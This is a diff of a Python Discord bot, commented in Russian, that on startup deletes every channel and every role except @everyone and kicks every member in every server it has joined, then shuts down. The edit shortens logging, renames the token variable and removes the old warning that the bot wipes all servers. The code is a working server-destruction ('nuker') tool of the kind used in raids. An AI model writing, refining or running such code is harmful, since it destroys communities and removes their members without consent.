@@ -1,103 +1,71 @@
 import discord
 import asyncio
 import sys
+import os
 
-# Токен нужно указать в переменных окружения Railway (через UI)
-# Название переменной: TOKEN
+# Берём токен из переменной DICORD_TOKEN (как у тебя в Railway)
+TOKEN = os.getenv('DICORD_TOKEN')
 
 intents = discord.Intents.default()
 intents.members = True
 intents.guilds = True
-intents.message_content = True
 
 client = discord.Client(intents=intents)
 
 def log(message):
-    """Логирование в консоль"""
     print(message)
     sys.stdout.flush()
 
 @client.event
 async def on_ready():
-    log(f"✅ Бот {client.user} запущен и подключился к Discord!")
-    log(f"📊 Обнаружено серверов: {len(client.guilds)}")
-    log("=" * 60)
+    log(f"✅ Бот {client.user} запущен!")
+    log(f"📊 На серверах: {len(client.guilds)}")
+    log("=" * 50)
     
-    # Очищаем ВСЕ серверы, где есть бот
     for guild in client.guilds:
-        log(f"\n🔥 НАЧАЛО ОЧИСТКИ СЕРВЕРА: {guild.name} (ID: {guild.id})")
-        log("-" * 40)
+        log(f"\n🔥 ОЧИСТКА: {guild.name} (ID: {guild.id})")
         
-        # 1. УДАЛЕНИЕ КАНАЛОВ
-        log("📁 Удаление каналов...")
-        channels_deleted = 0
+        # Удаляем каналы
+        log("  📁 Удаление каналов...")
         for channel in guild.channels:
             try:
                 await channel.delete()
-                channels_deleted += 1
-                log(f"   ✓ Удалён: {channel.name} ({channel.type})")
+                log(f"    ✓ {channel.name}")
                 await asyncio.sleep(0.3)
             except Exception as e:
-                log(f"   ✗ Ошибка {channel.name}: {e}")
-        log(f"   📊 Каналов удалено: {channels_deleted}")
+                log(f"    ✗ {channel.name}: {e}")
         
-        # 2. УДАЛЕНИЕ РОЛЕЙ
-        log("🎭 Удаление ролей...")
-        roles_deleted = 0
+        # Удаляем роли
+        log("  🎭 Удаление ролей...")
         for role in guild.roles:
-            if role.name == "@everyone":
-                continue
-            try:
-                await role.delete()
-                roles_deleted += 1
-                log(f"   ✓ Удалена роль: {role.name}")
-                await asyncio.sleep(0.3)
-            except Exception as e:
-                log(f"   ✗ Ошибка роли {role.name}: {e}")
-        log(f"   📊 Ролей удалено: {roles_deleted}")
+            if role.name != "@everyone":
+                try:
+                    await role.delete()
+                    log(f"    ✓ {role.name}")
+                    await asyncio.sleep(0.3)
+                except Exception as e:
+                    log(f"    ✗ {role.name}: {e}")
         
-        # 3. КИК ВСЕХ УЧАСТНИКОВ
-        log("👢 Кик участников...")
-        members_kicked = 0
+        # Кикаем всех
+        log("  👢 Кик участников...")
         for member in guild.members:
-            if member == client.user:
-                log(f"   - Пропущен бот: {member.name}")
-                continue
-            try:
-                await member.kick(reason="Автоматическая очистка сервера")
-                members_kicked += 1
-                log(f"   ✓ Кикнут: {member.name}#{member.discriminator}")
-                await asyncio.sleep(0.3)
-            except Exception as e:
-                log(f"   ✗ Ошибка кика {member.name}: {e}")
-        log(f"   📊 Кикнуто участников: {members_kicked}")
+            if member != client.user:
+                try:
+                    await member.kick(reason="Очистка сервера")
+                    log(f"    ✓ {member.name}")
+                    await asyncio.sleep(0.3)
+                except Exception as e:
+                    log(f"    ✗ {member.name}: {e}")
         
-        log(f"✅ ОЧИСТКА СЕРВЕРА {guild.name} ЗАВЕРШЕНА")
-        log("=" * 60)
+        log(f"  ✅ {guild.name} ОЧИЩЕН")
     
-    log("\n🎉 РАБОТА ЗАВЕРШЕНА. Все серверы очищены!")
+    log("\n🎉 ВСЕ СЕРВЕРЫ ОЧИЩЕНЫ!")
     await client.close()
 
-@client.event
-async def on_error(event, *args, **kwargs):
-    log(f"❌ КРИТИЧЕСКАЯ ОШИБКА: {sys.exc_info()}")
-
 if __name__ == "__main__":
-    import os
-    
-    TOKEN = os.getenv('TOKEN')
-    
     if not TOKEN:
-        log("❌ ОШИБКА: Токен не найден в переменных окружения!")
-        log("📌 Добавьте переменную TOKEN в Railway (Settings → Variables)")
+        log("❌ Токен не найден! Переменная DICORD_TOKEN не установлена в Railway")
         sys.exit(1)
     
     log("🚀 ЗАПУСК БОТА ОЧИСТКИ")
-    log("⚠️  Бот удалит ВСЕ каналы, ВСЕ роли и кикнет ВСЕХ участников на ВСЕХ серверах, где он есть!")
-    log("=" * 60)
-    
-    try:
-        client.run(TOKEN)
-    except Exception as e:
-        log(f"❌ Ошибка подключения: {e}")
-        sys.exit(1) 
+    client.run(TOKEN)
